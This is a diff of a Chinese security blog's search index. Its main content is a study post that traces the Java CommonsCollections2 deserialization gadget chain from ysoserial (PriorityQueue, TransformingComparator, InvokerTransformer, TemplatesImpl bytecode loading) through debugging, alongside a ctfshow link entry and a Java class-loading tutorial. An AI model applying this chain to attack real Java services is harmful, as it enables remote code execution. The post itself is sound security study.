@@ -159,6 +159,122 @@
       </tags>
   </entry>
   <entry>
+    <title>CommonsCollections2反序列化链分析</title>
+    <url>/2022/03/17/cc2/</url>
+    <content><![CDATA[<p>经过CC1和URLDNS两条链子的洗礼，从CC2开始打算自主调试分析</p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>依赖：commons-collections4-4.0.jar</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			PriorityQueue.readObject()</span><br><span class="line">				...</span><br><span class="line">					TransformingComparator.compare()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.<span class="built_in">exec</span>()</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Gadgets-createTemplatesImpl"><a href="#Gadgets-createTemplatesImpl" class="headerlink" title="Gadgets.createTemplatesImpl( )"></a>Gadgets.createTemplatesImpl( )</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317114550-va46ovc.png" alt="image.png"></p>
+<p>跟进</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317114752-jzogs5x.png" alt="image.png"></p>
+<p>这里稍有复杂，先一步一步分析</p>
+<p>首先实例化了<code>class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317114908-ygjrpcf.png" alt="image.png"></p>
+<p>初始化ClassPool对象，插入ClassPath</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317131106-nfrtssh.png" alt="image.png"></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317132149-w56pc8g.png" alt="image.png"></p>
+<p>通过ClassPool实例的.get()方法，获取CtClass对象</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317132256-kc80qb9.png" alt="image.png"></p>
+<blockquote>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317142449-vfzv2oi.png" alt="image.png"></p>
+<p>这个类作为基类，下面的操作都是基于此进行修改</p>
+</blockquote>
+<p>为CtClass添加一个静态块，当这个类被实例化的时候，静态块内代码会执行，也就是我们传入的恶意命令</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317132423-4j4y9dz.png" alt="image.png"></p>
+<p>为这个类重新命名</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317141133-nh7mnqv.png" alt="image.png"></p>
+<p>获取到AbstTranslet类并将其设置为刚刚类的父类</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317141212-tjrypda.png" alt="image.png"></p>
+<p>添加一行输出，查看刚刚系一列操作最后得到的Class</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317141856-c7cd25q.png" alt="image.png"></p>
+<p>这个时候就能很容易的把上面的各种Javassist的操作对应起来。Ysoserial用JAVAssist操作来动态修改了这个Class并且加入了一个会被自动加载的，存有恶意代码的静态块。</p>
+<p>把字节码加载到实例对象里面，用<code>Reflections.setFieldValue</code>设置成<code>templates</code>域值</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317142921-ornj7ux.png" alt="image.png"></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317143105-jpws1a4.png" alt="image.png"></p>
+<p>返回templates对象，方法结束</p>
+<h2 id="new-InvokerTransformer-）"><a href="#new-InvokerTransformer-）" class="headerlink" title="new InvokerTransformer( ）"></a>new InvokerTransformer( ）</h2><p>实例化InvokerTransformer</p>
+<p>根据注释，这里只是模仿了method name，就是说还没有armed攻击载荷。</p>
+<p>toString方法也不是想要反射调用的方法，只是占位。</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317144841-4loees4.png" alt="image.png"></p>
+<p>关于<code>InvokerTransformer</code>在CC1里面分析过了，这里不再赘述，其<code>transform</code>方法可以反射调用，为CC的最根本的漏洞成因。</p>
+<h2 id="new-PriorityQueue"><a href="#new-PriorityQueue" class="headerlink" title="new PriorityQueue( )"></a>new PriorityQueue( )</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317145438-b590ujj.png" alt="image.png"></p>
+<p>新建一个优先级队列<a href="https://www.cainiaojc.com/java/java-priorityqueue.html">https://www.cainiaojc.com/java/java-priorityqueue.html</a></p>
+<p>初始化的时候将新建的<code>TransformingComparator</code>作为比较器传入</p>
+<blockquote>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317145917-8yk8pyj.png" alt="image.png"></p>
+</blockquote>
+<p>当我们跟进<code>TransformingComparator</code>的时候，很清晰的能看到它的compare方法，调用了比较的两个对象的transform方法，这不就来了吗，初始化<code>TransformingComparator</code>的时候，传入的transformer是<code>InvokerTransformer</code>实例，这里调用的就是<code>InvokerTransformer.transform</code>方法，实现反射调用<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317150034-fxou8lo.png" alt="image.png"></p>
+<p>但是现在这个方法有点没头没尾的，哪里调用了compare，传入的两个参数又是啥，先看ysoserial怎么处理</p>
+<h2 id="Reflections-setFieldValue"><a href="#Reflections-setFieldValue" class="headerlink" title="Reflections.setFieldValue( )"></a>Reflections.setFieldValue( )</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317150829-tcz6qkn.png" alt="image.png"></p>
+<p>之前占位的<code>toString</code>被更改为<code>newTransFormer</code></p>
+<p>获取到了刚实例化的优先级字段的域值，进行修改</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317151310-37rpoxj.png" alt="image.png"></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317151343-1k6rkv1.png" alt="image.png"></p>
+<p>数组第一个元素变为刚刚包含了恶意字节码的templates对象，他就是上面用来<code>compare</code>的object对象</p>
+<blockquote>
+<p>这两个赋值操作让我一下豁然开朗啊！ysoserial就是这个模式，前面用占位符避免在payload生成的时候触发，最后用反射方法来赋值。所以到最后才能get到他的payload逻辑！</p>
+</blockquote>
+<p>也就是说这条链子的逻辑大概是这个样子：</p>
+<ol>
+<li><p>优先级列表进行排序，自定义了<code>comparator</code>为<code>TransformingComparator</code></p>
+</li>
+<li><p>对<code>templates</code>进行排序的时候，它实际上在这里</p>
+<p> <img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317152746-gqnj1oq.png" alt="image.png"></p>
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">调用的是</span><br><span class="line">InvokerTransformer.transform(templates)</span><br></pre></td></tr></table></figure></li>
+<li><p>templates的<code>iMethodName</code>为<code>newTransFormer</code>，因为templates 实例对象是 TemplatesImpl 类型的 , 实际上反射调用的是<code>TemplatesImpl.newTransformer()</code>方法</p>
+</li>
+<li><p>这个时候如果我们的恶意Class文件被怎么着实例化了，就能够触发恶意代码</p>
+</li>
+</ol>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317153538-zf16p1d.png" alt="image.png"></p>
+<p>最后将这个队列对象返回，进行序列化</p>
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>通过调试，我想知道以下几个问题</p>
+<ol>
+<li>完整调用过程</li>
+<li>上面的Class怎么被加载，导致恶意代码执行，因为<code>TemplatesImpl.newTransformer()</code>并不是终点。</li>
+<li>触发队列排序的地方</li>
+</ol>
+<p>在PriorityQueue的<code>readObject</code>方法处打上断点截断</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317154349-dnxeu9d.png" alt="image.png"></p>
+<p>通过遍历将序列化的数据读了出来，可以看到templates被读取了出来</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317155846-qr4wpy3.png" alt="image.png"></p>
+<p>步入heapify()方法</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160037-2fmtlrn.png" alt="image.png"></p>
+<p>直接步入siftDown方法</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160126-gs6bfq0.png" alt="image.png"></p>
+<p>步入siftDownUsingComparator方法，这里我们要用上自己定义的Comparator了！</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160424-k6j16q9.png" alt="image.png"></p>
+<p>步入compare方法</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160559-wx6wovo.png" alt="image.png"></p>
+<p>调用的就是<code>InvokerTransformer.transform()</code></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160922-ng7c9gj.png" alt="image.png"></p>
+<p>（多走了一步，红框处就是反射调用了newTransformer</p>
+<p>即<code>TemplatesImpl.newTransformer</code>，弹出计算器</p>
+<p>所以我们必须要深究一下<code>TemplatesImpl.newTransformer</code></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317161011-l4ak8ht.png" alt="image.png"><br /></p>
+<h2 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer"></a>TemplatesImpl.newTransformer</h2><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer</p>
+<p>反射调用的方法，必须要在这里打断点才能截获</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317171807-pllwi2a.png" alt="image.png"></p>
+<p>步入<code>getTransletInstance()</code></p>
+<p>这里需要<code>_name</code>不为空才能往下面走<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317183234-7z9vpqi.png" alt="image.png"></p>
+<p>继续步入<code>defineTransletClasses()</code></p>
+<p>使用ClassLoader加载恶意字节码</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317202505-rjvq4th.png" alt="image.png"></p>
+<p>且这里他的父类要是”com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet”，才能在下面实例化</p>
+<p>加载完字节码之后，实例化，触发恶意方法，cc2结束</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317202753-2qx49lg.png" alt="image.png"></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317162134-vjaktpv.png" alt="image.png"></p>
+]]></content>
+      <categories>
+        <category>javaSec</category>
+      </categories>
+      <tags>
+        <tag>java反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CommonsCollections4反序列化链分析</title>
     <url>/2022/04/03/cc4/</url>
     <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文分析调试ysoserial中的CC4。</p>
@@ -399,6 +515,21 @@
       </categories>
       <tags>
         <tag>java反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow做题记录合集</title>
+    <url>/2022/04/01/ctfshow%E7%9A%84wp/</url>
+    <content><![CDATA[<h1 id="我的ctfshow做题记录"><a href="#我的ctfshow做题记录" class="headerlink" title="我的ctfshow做题记录"></a>我的ctfshow做题记录</h1><p>因为太多了，所以索性放在了一起</p>
+<p><a href="https://silly-blade-feb.notion.site/My-ctfshow-writewp-8112c993ef374957a5eadd8af4455542">https://silly-blade-feb.notion.site/My-ctfshow-writewp-8112c993ef374957a5eadd8af4455542</a></p>
+<p>就都放在这里了，慢慢搬上来（还有补完</p>
+<p>我要当赛棍！</p>
+]]></content>
+      <categories>
+        <category>ctfStudy</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -865,137 +996,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ctfshow做题记录合集</title>
-    <url>/2022/04/01/ctfshow%E7%9A%84wp/</url>
-    <content><![CDATA[<h1 id="我的ctfshow做题记录"><a href="#我的ctfshow做题记录" class="headerlink" title="我的ctfshow做题记录"></a>我的ctfshow做题记录</h1><p>因为太多了，所以索性放在了一起</p>
-<p><a href="https://silly-blade-feb.notion.site/My-ctfshow-writewp-8112c993ef374957a5eadd8af4455542">https://silly-blade-feb.notion.site/My-ctfshow-writewp-8112c993ef374957a5eadd8af4455542</a></p>
-<p>就都放在这里了，慢慢搬上来（还有补完</p>
-<p>我要当赛棍！</p>
-]]></content>
-      <categories>
-        <category>ctfStudy</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CommonsCollections2反序列化链分析</title>
-    <url>/2022/03/17/cc2/</url>
-    <content><![CDATA[<p>经过CC1和URLDNS两条链子的洗礼，从CC2开始打算自主调试分析</p>
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>依赖：commons-collections4-4.0.jar</p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			PriorityQueue.readObject()</span><br><span class="line">				...</span><br><span class="line">					TransformingComparator.compare()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.<span class="built_in">exec</span>()</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Gadgets-createTemplatesImpl"><a href="#Gadgets-createTemplatesImpl" class="headerlink" title="Gadgets.createTemplatesImpl( )"></a>Gadgets.createTemplatesImpl( )</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317114550-va46ovc.png" alt="image.png"></p>
-<p>跟进</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317114752-jzogs5x.png" alt="image.png"></p>
-<p>这里稍有复杂，先一步一步分析</p>
-<p>首先实例化了<code>class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317114908-ygjrpcf.png" alt="image.png"></p>
-<p>初始化ClassPool对象，插入ClassPath</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317131106-nfrtssh.png" alt="image.png"></p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317132149-w56pc8g.png" alt="image.png"></p>
-<p>通过ClassPool实例的.get()方法，获取CtClass对象</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317132256-kc80qb9.png" alt="image.png"></p>
-<blockquote>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317142449-vfzv2oi.png" alt="image.png"></p>
-<p>这个类作为基类，下面的操作都是基于此进行修改</p>
-</blockquote>
-<p>为CtClass添加一个静态块，当这个类被实例化的时候，静态块内代码会执行，也就是我们传入的恶意命令</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317132423-4j4y9dz.png" alt="image.png"></p>
-<p>为这个类重新命名</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317141133-nh7mnqv.png" alt="image.png"></p>
-<p>获取到AbstTranslet类并将其设置为刚刚类的父类</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317141212-tjrypda.png" alt="image.png"></p>
-<p>添加一行输出，查看刚刚系一列操作最后得到的Class</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317141856-c7cd25q.png" alt="image.png"></p>
-<p>这个时候就能很容易的把上面的各种Javassist的操作对应起来。Ysoserial用JAVAssist操作来动态修改了这个Class并且加入了一个会被自动加载的，存有恶意代码的静态块。</p>
-<p>把字节码加载到实例对象里面，用<code>Reflections.setFieldValue</code>设置成<code>templates</code>域值</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317142921-ornj7ux.png" alt="image.png"></p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317143105-jpws1a4.png" alt="image.png"></p>
-<p>返回templates对象，方法结束</p>
-<h2 id="new-InvokerTransformer-）"><a href="#new-InvokerTransformer-）" class="headerlink" title="new InvokerTransformer( ）"></a>new InvokerTransformer( ）</h2><p>实例化InvokerTransformer</p>
-<p>根据注释，这里只是模仿了method name，就是说还没有armed攻击载荷。</p>
-<p>toString方法也不是想要反射调用的方法，只是占位。</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317144841-4loees4.png" alt="image.png"></p>
-<p>关于<code>InvokerTransformer</code>在CC1里面分析过了，这里不再赘述，其<code>transform</code>方法可以反射调用，为CC的最根本的漏洞成因。</p>
-<h2 id="new-PriorityQueue"><a href="#new-PriorityQueue" class="headerlink" title="new PriorityQueue( )"></a>new PriorityQueue( )</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317145438-b590ujj.png" alt="image.png"></p>
-<p>新建一个优先级队列<a href="https://www.cainiaojc.com/java/java-priorityqueue.html">https://www.cainiaojc.com/java/java-priorityqueue.html</a></p>
-<p>初始化的时候将新建的<code>TransformingComparator</code>作为比较器传入</p>
-<blockquote>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317145917-8yk8pyj.png" alt="image.png"></p>
-</blockquote>
-<p>当我们跟进<code>TransformingComparator</code>的时候，很清晰的能看到它的compare方法，调用了比较的两个对象的transform方法，这不就来了吗，初始化<code>TransformingComparator</code>的时候，传入的transformer是<code>InvokerTransformer</code>实例，这里调用的就是<code>InvokerTransformer.transform</code>方法，实现反射调用<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317150034-fxou8lo.png" alt="image.png"></p>
-<p>但是现在这个方法有点没头没尾的，哪里调用了compare，传入的两个参数又是啥，先看ysoserial怎么处理</p>
-<h2 id="Reflections-setFieldValue"><a href="#Reflections-setFieldValue" class="headerlink" title="Reflections.setFieldValue( )"></a>Reflections.setFieldValue( )</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317150829-tcz6qkn.png" alt="image.png"></p>
-<p>之前占位的<code>toString</code>被更改为<code>newTransFormer</code></p>
-<p>获取到了刚实例化的优先级字段的域值，进行修改</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317151310-37rpoxj.png" alt="image.png"></p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317151343-1k6rkv1.png" alt="image.png"></p>
-<p>数组第一个元素变为刚刚包含了恶意字节码的templates对象，他就是上面用来<code>compare</code>的object对象</p>
-<blockquote>
-<p>这两个赋值操作让我一下豁然开朗啊！ysoserial就是这个模式，前面用占位符避免在payload生成的时候触发，最后用反射方法来赋值。所以到最后才能get到他的payload逻辑！</p>
-</blockquote>
-<p>也就是说这条链子的逻辑大概是这个样子：</p>
-<ol>
-<li><p>优先级列表进行排序，自定义了<code>comparator</code>为<code>TransformingComparator</code></p>
-</li>
-<li><p>对<code>templates</code>进行排序的时候，它实际上在这里</p>
-<p> <img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317152746-gqnj1oq.png" alt="image.png"></p>
- <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">调用的是</span><br><span class="line">InvokerTransformer.transform(templates)</span><br></pre></td></tr></table></figure></li>
-<li><p>templates的<code>iMethodName</code>为<code>newTransFormer</code>，因为templates 实例对象是 TemplatesImpl 类型的 , 实际上反射调用的是<code>TemplatesImpl.newTransformer()</code>方法</p>
-</li>
-<li><p>这个时候如果我们的恶意Class文件被怎么着实例化了，就能够触发恶意代码</p>
-</li>
-</ol>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317153538-zf16p1d.png" alt="image.png"></p>
-<p>最后将这个队列对象返回，进行序列化</p>
-<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>通过调试，我想知道以下几个问题</p>
-<ol>
-<li>完整调用过程</li>
-<li>上面的Class怎么被加载，导致恶意代码执行，因为<code>TemplatesImpl.newTransformer()</code>并不是终点。</li>
-<li>触发队列排序的地方</li>
-</ol>
-<p>在PriorityQueue的<code>readObject</code>方法处打上断点截断</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317154349-dnxeu9d.png" alt="image.png"></p>
-<p>通过遍历将序列化的数据读了出来，可以看到templates被读取了出来</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317155846-qr4wpy3.png" alt="image.png"></p>
-<p>步入heapify()方法</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160037-2fmtlrn.png" alt="image.png"></p>
-<p>直接步入siftDown方法</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160126-gs6bfq0.png" alt="image.png"></p>
-<p>步入siftDownUsingComparator方法，这里我们要用上自己定义的Comparator了！</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160424-k6j16q9.png" alt="image.png"></p>
-<p>步入compare方法</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160559-wx6wovo.png" alt="image.png"></p>
-<p>调用的就是<code>InvokerTransformer.transform()</code></p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160922-ng7c9gj.png" alt="image.png"></p>
-<p>（多走了一步，红框处就是反射调用了newTransformer</p>
-<p>即<code>TemplatesImpl.newTransformer</code>，弹出计算器</p>
-<p>所以我们必须要深究一下<code>TemplatesImpl.newTransformer</code></p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317161011-l4ak8ht.png" alt="image.png"><br /></p>
-<h2 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer"></a>TemplatesImpl.newTransformer</h2><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer</p>
-<p>反射调用的方法，必须要在这里打断点才能截获</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317171807-pllwi2a.png" alt="image.png"></p>
-<p>步入<code>getTransletInstance()</code></p>
-<p>这里需要<code>_name</code>不为空才能往下面走<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317183234-7z9vpqi.png" alt="image.png"></p>
-<p>继续步入<code>defineTransletClasses()</code></p>
-<p>使用ClassLoader加载恶意字节码</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317202505-rjvq4th.png" alt="image.png"></p>
-<p>且这里他的父类要是”com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet”，才能在下面实例化</p>
-<p>加载完字节码之后，实例化，触发恶意方法，cc2结束</p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317202753-2qx49lg.png" alt="image.png"></p>
-<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317162134-vjaktpv.png" alt="image.png"></p>
-]]></content>
-      <categories>
-        <category>javaSec</category>
-      </categories>
-      <tags>
-        <tag>java反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/2022/06/01/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -1066,133 +1066,6 @@
 <li>调用方法的时候通过 <code>super.h.invoke(this, m1, (Object[])null);</code> 调用，其中的 <code>super.h.invoke</code> 实际上是在创建代理的时候传递给 <code>Proxy.newProxyInstance</code> 的 LogHandler 对象，它继承 InvocationHandler 类，负责实际的调用处理逻辑</li>
 </ul>
 <p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312090431-jubo9rh.png" alt="image.png"></p>
-]]></content>
-      <categories>
-        <category>javaSec</category>
-      </categories>
-      <tags>
-        <tag>java基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【基础】-JAVA 类加载</title>
-    <url>/2022/03/18/jichu-classloader/</url>
-    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>从一下几个方面了解JAVA中，类加载的原理</p>
-<ol>
-<li>java代码执行过程</li>
-<li>类的加载过程</li>
-<li>类加载器</li>
-<li>类加载机制</li>
-<li>自定义一个自己的类加载器</li>
-</ol>
-<h1 id="java代码执行流程"><a href="#java代码执行流程" class="headerlink" title="java代码执行流程"></a>java代码执行流程</h1><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318204423-paolccp.png" alt="image.png"><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318204536-oxlseqj.png" alt="image.png"></p>
-<p>当 .java 源码被 javac.exe 编译器编译成 .class 字节码文件后，接下来的工作就交给JVM处理。JVM首先通过类加载器(ClassLoader)，将class文件和相关Java API加载装入JVM，以供JVM后续处理。</p>
-<h1 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a>类的加载过程</h1><p>类的生命周期包括：加载、链接、初始化、使用、卸载</p>
-<p>其中前三个属于类的<u>加载过程</u></p>
-<h2 id="加载-loading"><a href="#加载-loading" class="headerlink" title="加载-loading"></a>加载-loading</h2><p>把<code>.class</code>文件加载到JVM里的过程</p>
-<ul>
-<li>通过类的全限定名来获取定义此类的二进制字节流</li>
-<li>将此二进制字节流所代表的静态存储结构转化成方法区的运行时数据结构</li>
-<li>在内存中生成代表此类的java.lang.Class对象,作为该类访问入口.</li>
-</ul>
-<h2 id="链接-linking"><a href="#链接-linking" class="headerlink" title="链接-linking"></a>链接-linking</h2><p>链接分为三步</p>
-<ul>
-<li><p>验证:验证的目的是确保class文件的字节流中信息符合虚拟机的要求，不会危害虚拟机安全，使得虚拟机免受恶意代码的攻击，这一步至关重要。</p>
-<blockquote>
-<p>文件格式验证<br>源数据验证<br>字节码验证<br>符号引用验证  </p>
-</blockquote>
-</li>
-<li><p>准备:准备阶段的工作就是为类的静态变量<strong>分配内存</strong>并设为jvm默认的<strong>初值</strong>，对于非静态的变量，则不会为它们分配内存。静态变量的初值为jvm默认的初值，而不是我们在程序中设定的初值。(仅包含类变量,不包含实例变量).</p>
-</li>
-<li><p>解析:虚拟机将常量池中的符号引用替换为直接引用，解析动作主要针对类或接口，字段，类方法，方法类型等等。</p>
-</li>
-</ul>
-<h2 id="初始化-initialization"><a href="#初始化-initialization" class="headerlink" title="初始化-initialization"></a>初始化-initialization</h2><p>在该阶段，才真正意义上的开始执行类中定义的java程序代码，该阶段会执行类构造器。</p>
-<blockquote>
-<p>暂讨论关于类生命周期的三种，之后在学习内存的时候细嗦</p>
-</blockquote>
-<h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><h2 id="ClassLoader的作用"><a href="#ClassLoader的作用" class="headerlink" title="ClassLoader的作用"></a>ClassLoader的作用</h2><blockquote>
-<p><strong>ClassLoader用于将class文件加载到JVM中。</strong></p>
-</blockquote>
-<p>另外一个作用是确认每个类应该由哪个类加载器加载。<br>第二个作用也用于判断JVM运行时的两个类是否相等，影响的判断方法有equals()、isAssignableFrom()、isInstance()以及instanceof关键字。</p>
-<h2 id="何时触发类加载"><a href="#何时触发类加载" class="headerlink" title="何时触发类加载"></a>何时触发类加载</h2><p>类加载的触发可以分为隐式加载和显示加载。</p>
-<h3 id="隐式加载"><a href="#隐式加载" class="headerlink" title="隐式加载"></a>隐式加载</h3><p>隐式加载包括以下几种情况：</p>
-<ul>
-<li>遇到new、getstatic、putstatic、invokestatic这4条字节码指令时</li>
-<li>对类进行反射调用时</li>
-<li>当初始化一个类时，如果其父类还没有初始化，优先加载其父类并初始化</li>
-<li>虚拟机启动时，需指定一个包含main函数的主类，优先加载并初始化这个主类</li>
-</ul>
-<h3 id="显式加载"><a href="#显式加载" class="headerlink" title="显式加载"></a>显式加载</h3><p>显示加载包含以下几种情况：</p>
-<ul>
-<li>通过ClassLoader的loadClass方法</li>
-<li>通过Class.forName（反射获取Class）</li>
-<li>通过ClassLoader的findClass方法</li>
-</ul>
-<h2 id="ClassLoader分类"><a href="#ClassLoader分类" class="headerlink" title="ClassLoader分类"></a>ClassLoader分类</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318210756-8jnb18t.png" alt="image.png"></p>
-<p>从上到下认识他们</p>
-<h3 id="启动类-x2F-引导类：Bootstrap-ClassLoader"><a href="#启动类-x2F-引导类：Bootstrap-ClassLoader" class="headerlink" title="启动类&#x2F;引导类：Bootstrap ClassLoader"></a>启动类&#x2F;引导类：Bootstrap ClassLoader</h3><p>这个类加载器使用C&#x2F;C++语言实现的，嵌套在JVM内部，java程序无法直接操作这个类。它用来加载<strong>Java核心类库</strong>，如：<code>JAVA_HOME/jre/lib/rt.jar</code>、<code>resources.jar</code>、<code>sun.boot.class.path</code>路径下的包，用于提供<strong>jvm运行所需的包</strong>。</p>
-<p>并不是继承自java.lang.ClassLoader，它没有父类加载器</p>
-<p>它加载<code>扩展类加载器</code>和<code>应用程序类加载器</code>，并成为他们的<strong>父类加载器</strong></p>
-<p>出于安全考虑，启动类只加载包名为：java、javax、sun开头的类</p>
-<h3 id="扩展类加载器：Extension-ClassLoader"><a href="#扩展类加载器：Extension-ClassLoader" class="headerlink" title="扩展类加载器：Extension ClassLoader"></a>扩展类加载器：Extension ClassLoader</h3><p>Java语言编写，由<code>sun.misc.Launcher$ExtClassLoader</code>实现，我们可以用Java程序操作这个加载器派生继承自java.lang.ClassLoader，父类加载器为<code>启动类加载器</code></p>
